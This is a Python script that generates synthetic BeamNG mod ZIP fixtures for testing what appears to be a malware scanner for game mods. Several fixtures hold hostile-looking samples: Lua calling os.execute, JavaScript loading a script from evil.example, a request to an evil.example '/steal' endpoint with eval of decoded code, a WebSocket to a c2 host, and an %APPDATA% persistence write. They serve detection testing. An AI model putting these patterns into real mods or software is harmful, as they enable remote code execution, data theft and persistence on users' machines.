"""Generate tiny synthetic BeamNG mod ZIP fixtures for tests.

These are authored test cases — we do not distribute real malware samples.
"""

from __future__ import annotations

import zipfile
from pathlib import Path

FIX = Path(__file__).resolve().parent / "fixtures"


def _write_zip(path: Path, files: dict[str, bytes | str]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            data = content.encode("utf-8") if isinstance(content, str) else content
            zf.writestr(name, data)


def main() -> None:
    FIX.mkdir(parents=True, exist_ok=True)

    _write_zip(
        FIX / "clean_vehicle.zip",
        {
            "vehicles/testcar/info.json": '{"Name":"Test Car"}\n',
            "vehicles/testcar/testcar.jbeam": '{"testcar":{}}\n',
        },
    )

    _write_zip(
        FIX / "wrapped_mod.zip",
        {
            "MyCoolCar/vehicles/coolcar/info.json": '{"Name":"Cool"}\n',
        },
    )

    _write_zip(
        FIX / "with_exe.zip",
        {
            "vehicles/evil/info.json": "{}\n",
            "vehicles/evil/helper.exe": b"MZ" + b"\x00" * 64,
        },
    )

    long_b64 = "A" * 100 + "=="
    _write_zip(
        FIX / "malicious_lua.zip",
        {
            "lua/ge/extensions/evil.lua": (
                "local ffi = require('ffi')\n"
                "os.execute('cmd.exe /c whoami')\n"
                f"local payload = '{long_b64}'\n"
            ),
        },
    )

    _write_zip(
        FIX / "suspicious_js.zip",
        {
            "ui/modules/apps/demo/app.js": "console.log('ok');\n",
            "scripts/weird.js": "eval('alert(1)');\n",
        },
    )

    _write_zip(
        FIX / "clean_gauges_screen.zip",
        {
            "vehicles/car/gauges_screen/gauges_screen.js": (
                "angular.module('gaugesScreen', [])\n"
                ".directive('bngMapRenderUncompressed', function () {\n"
                "  return { template: '<svg></svg>' };\n"
                "});\n"
                "//https://stackoverflow.com/a/56266358\n"
                "var icon = 'data:image/png;base64," + ("A" * 180) + "';\n"
            ),
            "vehicles/car/gauges_screen2/gauges_screen.js": (
                "angular.module('gaugesScreen2', [])\n"
                ".directive('dash', function () { return {}; });\n"
            ),
            "vehicles/car/ScreenGaugeAMG/gauges_screen_AMG.js": (
                "angular.module('amg', [])\n"
                ".directive('dash', function () { return {}; });\n"
            ),
            "vehicles/car/mmi_2g_basic/mmi.js": "console.log('mmi');\n",
            "vehicles/car/dash/board.js": "console.log('dash');\n",
            "vehicles/car/gauges_screen_MERS/gauges_screen.js": (
                "['DatePage', 'InfoPage'].forEach((page) => {\n"
                "  eval(page).root.n.style.display = 'inline';\n"
                "});\n"
            ),
            "vehicles/car/lua/controller/demo.lua": (
                "-- This Source Code Form is subject to the terms of the bCDDL, v. 1.1.\n"
                "-- If a copy of the bCDDL was not distributed with this\n"
                "-- file, You can obtain one at http://beamng.com/bCDDL-1.1.txt\n"
                "local M = {}\n"
                "return M\n"
            ),
        },
    )

    _write_zip(
        FIX / "remote_js_malware.zip",
        {
            "vehicles/car/gauges_screen/gauges_screen.html": (
                "<html><script src=\"https://evil.example/payload.js\"></script></html>\n"
            ),
            "vehicles/car/gauges_screen/gauges_screen.js": (
                "var x = new XMLHttpRequest();\n"
                "x.open('GET', 'https://evil.example/steal');\n"
                "var code = atob('SGVsbG8=');\n"
                "eval(code);\n"
            ),
        },
    )

    _write_zip(
        FIX / "gauge_hidden_eval.zip",
        {
            "vehicles/car/ScreenGaugeAMG/evil.js": (
                "eval(page).ok = true;\n"
                "eval('alert(1)');\n"
            ),
        },
    )

    # --- Synthetic fixtures from the improvement plan ---
    _write_zip(
        FIX / "fp_extensions_load.zip",
        {
            "scripts/modScript.lua": (
                "extensions.load('trueBeamTouch')\n"
                "load('radarDetectorCore')\n"
                "obj:queueGameEngineLua(\"extensions.load('parktronicge')\")\n"
            ),
            "vehicles/car/info.json": "{}\n",
        },
    )

    _write_zip(
        FIX / "evil_os_execute.zip",
        {
            "lua/ge/extensions/bad.lua": "os.execute('whoami')\n",
        },
    )

    _write_zip(
        FIX / "evil_ffi.zip",
        {
            "lua/ge/extensions/bad.lua": "local ffi = require('ffi')\nffi.cdef[[void exit(int);]]\n",
        },
    )

    _write_zip(
        FIX / "evil_websocket.zip",
        {
            "ui/modules/apps/spy/app.js": "const ws = new WebSocket('wss://evil.example/c2');\n",
        },
    )

    _write_zip(
        FIX / "evil_write_appdata.zip",
        {
            "lua/ge/extensions/bad.lua": (
                'jsonWriteFile("%APPDATA%/Evil/persist.json", {ok=true})\n'
            ),
        },
    )

    # One dense obfuscated line with while-true + v0/v1
    obf_body = (
        "local v0={};local function v1(v9,v10) if (type(v9)=='string') then end "
        "local v21=1;while true do if (v21==1) then v21=2;else break;end end end;return v0;"
    )
    # pad to >400 chars
    obf_body = obf_body + (" " + "x" * 50) * 8
    _write_zip(
        FIX / "obfuscated_lua.zip",
        {
            "lua/ge/extensions/obf.lua": "-- banner\n" + obf_body + "\n",
        },
    )

    _write_zip(
        FIX / "html_credit_comment.zip",
        {
            "vehicles/car/dash/board.html": (
                "<!DOCTYPE html>\n"
                "<! DO NOT USE WITHOUT PERMISSION! ASK ME AT https://www.beamng.com/members/someone.1/>\n"
                "<html><body>ok</body></html>\n"
            ),
        },
    )

    _write_zip(
        FIX / "dynamic_load_cmd.zip",
        {
            "vehicles/car/lua/controller/triggers.lua": (
                "local cmd = action.onPress\n"
                "cmd = cmd:gsub('VALUE', tostring(value))\n"
                "local fn = load(cmd)\n"
                "if fn then pcall(fn) end\n"
            ),
        },
    )

    print(f"Wrote fixtures to {FIX}")


if __name__ == "__main__":
    main()
